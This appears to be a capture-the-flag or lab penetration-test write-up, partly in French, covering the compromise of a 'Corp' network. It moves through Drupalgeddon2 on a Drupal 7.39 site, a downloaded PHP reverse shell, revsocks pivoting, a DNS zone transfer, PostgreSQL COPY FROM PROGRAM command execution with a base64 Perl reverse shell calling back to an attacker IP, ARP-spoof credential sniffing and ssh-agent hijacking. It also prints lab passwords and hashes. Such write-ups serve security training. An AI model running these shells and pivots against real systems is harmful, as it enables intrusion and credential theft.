# Corp

## Recon

We only have the network used by the machines Corp1 & Corp2 : `172.16.23.0/24`

### Network scanning

```bash
nmap -sCV --top-ports 5 -vvv -oA scan 172.16.23.0/24
```

Two machines seems to be up :

```sh
172.16.23.56 80,443 (Web Server)
172.16.23.7 53 (DNS Server)
```
The certificate for 172.16.23.56:443 informs us that the domain name that matches the IP is `drupal.corp.lab`
Lets add the DNS Server to our `/etc/resolv.conf`

```bash
nameserver 172.16.23.7
```

We have a result on drupal.corp.lab

## Web application

We have a robots.txt file on `/robots.txt`

robots.txt
```bash
User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt      # Drupal 7.39
Disallow: /cron.php			  # DENIED
Disallow: /INSTALL.mysql.txt  # Useless
Disallow: /INSTALL.pgsql.txt  # Useless
Disallow: /INSTALL.sqlite.txt # Useless
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```
### Enumeration

**Gobuster**

```bash
/.php                 (Status: 403) [Size: 281]
/.html                (Status: 403) [Size: 281]
/search               (Status: 403) [Size: 7944]
/profiles             (Status: 301) [Size: 323] [--> https://drupal.corp.lab/profiles/]
/index.php            (Status: 200) [Size: 7994]
/0                    (Status: 200) [Size: 7994]
/themes               (Status: 301) [Size: 321] [--> https://drupal.corp.lab/themes/]
/admin                (Status: 403) [Size: 8101]
/sites                (Status: 301) [Size: 320] [--> https://drupal.corp.lab/sites/]
/misc                 (Status: 301) [Size: 319] [--> https://drupal.corp.lab/misc/]
/includes             (Status: 301) [Size: 323] [--> https://drupal.corp.lab/includes/]
```

**Droopescan**

```bash
droopescan scan drupal -u https://drupal.corp.lab
[+] Plugins found:
    profile https://drupal.corp.lab/modules/profile/
    php https://drupal.corp.lab/modules/php/
    image https://drupal.corp.lab/modules/image/

[+] Themes found:
    seven https://drupal.corp.lab/themes/seven/
    garland https://drupal.corp.lab/themes/garland/

[+] Possible version(s):
    7.39

[+] Possible interesting urls found:
    Default changelog file - https://drupal.corp.lab/CHANGELOG.txt
    Default admin - https://drupal.corp.lab/user/login

[+] Scan finished (0:08:04.144387 elapsed)
```

### Known CVE

Using durpalgeddon2 we have a meterpreter shell on the server as www-data

module options
```bash
RHOST https://durpal.corp.lab
RPORT 443
LHOST 192.168.56.3
LPORT 80
```

We have writing rights on `/var/www`, we can rename drupal to drupalbackup then copy drupalbackup to a new folder called drupal, and then put a reverse php shell in it.

```bash
mv drupal drupalbackup
cp -r drupalbackup drupal
cd drupal
wget 192.168.56.3/shell.php #/usr/share/webshells/php/php-reverse-shell.php
```

## Privilege escalation


### Enumeration

We found some password. Might be useless.

linepeas.sh
```bash
array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'vUIj3OcWtinZ',
      'host' => '10.0.20.12',
      'port' => '5432',
      'driver' => 'pgsql',
      'prefix' => '',
    ),
```

### Rebound

Lets configure revsocks to establish a proxy to the client network.

kali
```bash
./revsocks_linux_amd64 -listen :443 -socks 127.0.0.1:1080 -pass test -tls
```

corp1
```bash
./revsocks_linux_amd64 -connect 192.168.56.3:443 -pass test -tls
```

Lets configure `proxychains` to run commands quicker

kali
```bash
echo "socks5  127.0.0.1 1080" >> /etc/proxychains4.conf
```

# Corp with internal network access

On a le DNS dans `/etc/resolv.conf` pour la zone `corp.local`

```bash
search corp.local
nameserver 10.0.0.20
```

En faisant un transfert de zone on récupère toutes les IPs

```bash
$ host -t axfr corp.local
Trying "corp.local"d 
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27936
;; flags: qr aa ra; QUERY: 1, ANSWER: 12, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;corp.local.                    IN      AXFR

;; ANSWER SECTION:
corp.local.             604800  IN      SOA     ns.corp.local. 12. 604800 86400 2419200 604800 604800
corp.local.             604800  IN      NS      ns.corp.local.
corp.local.             604800  IN      A       10.0.0.20
db.corp.local.          604800  IN      A       10.0.20.12
dev.corp.local.         604800  IN      A       10.0.20.71
git.corp.local.         604800  IN      A       10.0.0.42
inf.corp.local.         604800  IN      A       10.0.0.100
ns.corp.local.          604800  IN      A       10.0.0.20
web.corp.local.         604800  IN      A       10.0.10.5
ws1.corp.local.         604800  IN      A       10.0.1.25
ws2.corp.local.         604800  IN      A       10.0.1.32
corp.local.             604800  IN      SOA     ns.corp.local. 12. 604800 86400 2419200 604800 604800
```

## Recon

![](network.png)

```bash
web 10.0.10.5

inf 10.0.0.100
git 10.0.0.42
ns 10.0.0.20

db 10.0.20.12
dev 10.0.20.71 8080

ws1 10.0.1.25 22
ws2 10.0.1.32
```

## Exploration

### db

We can connect to the db 10.0.20.12 using `username:drupal,password:vUIj3OcWtinZ`

```bash
psql -h 10.0.20.12 -d drupal -U drupal
```

users \(drupal\)
```bash
admin   $S$Dpkc7n2SiFUPeyKqvImJea4RhMo9DEnhN/uNRDQnGSvhICjfzK7b admin@example.com
josh    $S$Diz04AtckwvS3JwRepNSSDQC51h9WOdbqYWLZoQRkaljtry1P0Zd josh@corp.local
```

auth_id \(postgres settings `SELECT * FROM pg_authid WHERE rolname='jim';`\)
```bash
root    md590d43f235b7a9cb4df622d06d09fa772
drupal  md531c153481af0e5bd4ffba3e645b261e3
jim     md5332072209f2c95d573816812d417d3bf
```

With hashcat we found one password 

```bash
root:tesoro
```

We have RCE with drupal user as it is a super user:
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

Let's pop a reverse shell
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'echo "dXNlIFNvY2tldDskaT0iMTkyLjE2OC41Ni4zIjskcD04MDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTs=" | base64 --decode | perl';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

We have a connexion in db.
We quickly escalate to root using the `tesoro` password previously found.

Using pspy we notice that the user Jim is connecting to postgresql with the password `JimFromCorp123`

db checkpoint : `ssh root@172.16.255.12`

### ws1

We can connect to ws1 with `ssh jim@ws1.corp.local` and `JimFromCorp123`


#### ARP Spoofing

```
Gateway : 10.0.1.1
WS2 : 10.0.32.1
```

We found josh password in an HTTP POST request
```bash
09:34:27.512385 IP ws2.corp.local.40630 > 172.16.23.56.http: Flags [P.], seq 0:295, ack 1, win 502, options [nop,nop,TS val 255544438 ecr 1742762074], length 295: HTTP: POST /node?destination=node HTTP/1.1
        0x0000:  4500 015b 944a 4000 3f06 d7ea 0a00 0120  E..[.J@.?.......
        0x0010:  ac10 1738 9eb6 0050 60f7 f7cb f39b ff2b  ...8...P`......+
        0x0020:  8018 01f6 cfb5 0000 0101 080a 0f3b 4c76  .............;Lv
        0x0030:  67e0 705a 504f 5354 202f 6e6f 6465 3f64  g.pZPOST./node?d
        0x0040:  6573 7469 6e61 7469 6f6e 3d6e 6f64 6520  estination=node.
        0x0050:  4854 5450 2f31 2e31 0d0a 486f 7374 3a20  HTTP/1.1..Host:.
        0x0060:  6472 7570 616c 2e63 6f72 702e 6c61 620d  drupal.corp.lab.
        0x0070:  0a41 6363 6570 743a 202a 2f2a 0d0a 5573  .Accept:.*/*..Us
        0x0080:  6572 2d41 6765 6e74 3a20 4d6f 7a69 6c6c  er-Agent:.Mozill
        0x0090:  612f 352e 300d 0a43 6f6e 7465 6e74 2d4c  a/5.0..Content-L
        0x00a0:  656e 6774 683a 2031 3234 0d0a 436f 6e74  ength:.124..Cont
        0x00b0:  656e 742d 5479 7065 3a20 6170 706c 6963  ent-Type:.applic
        0x00c0:  6174 696f 6e2f 782d 7777 772d 666f 726d  ation/x-www-form
        0x00d0:  2d75 726c 656e 636f 6465 640d 0a0d 0a6e  -urlencoded....n
        0x00e0:  616d 653d 6a6f 7368 2670 6173 733d 4961  ame=josh&pass=Ia
        0x00f0:  6d4a 6f73 6834 3332 3126 666f 726d 5f62  mJosh4321&form_b
        0x0100:  7569 6c64 5f69 643d 666f 726d 2d77 735f  uild_id=form-ws_
        0x0110:  6442 4362 4f42 3669 4a79 326c 6d38 5a33  dBCbOB6iJy2lm8Z3
        0x0120:  4275 7479 7945 2d4a 3769 786e 624b 6e4a  ButyyE-J7ixnbKnJ
        0x0130:  7453 5658 4c51 6273 2666 6f72 6d5f 6964  tSVXLQbs&form_id
        0x0140:  3d75 7365 725f 6c6f 6769 6e5f 626c 6f63  =user_login_bloc
        0x0150:  6b26 6f70 3d4c 6f67 2b69 6e              k&op=Log+in
```

```bash
josh:IamJosh4321
```

### ws2

On `/home/josh/.ssh` there are multiple interresting keys that are showing access to `git`, `ns` and `inf`.
Using the unix socket in /tmp/ssh-* of the ssh-agent we are able to connect to `ns.corp.local`

### ns

.ssh
```bash
drwxr-xr-x 2 root root    7 Dec 19 01:14 .
drwx------ 4 root root    9 Dec 19 01:14 ..
-rw-r--r-- 1 root root  562 Sep  7  2022 authorized_keys
-rw-r--r-- 1 root root   18 Dec  8 22:24 config
-rw-r--r-- 1 root root  352 Dec 19 01:14 known_hosts      #inf
-rw------- 1 root root 2590 Sep  7  2022 lxd-backup       #private key
-rw-r--r-- 1 root root  561 Sep  7  2022 lxd-backup.pub
```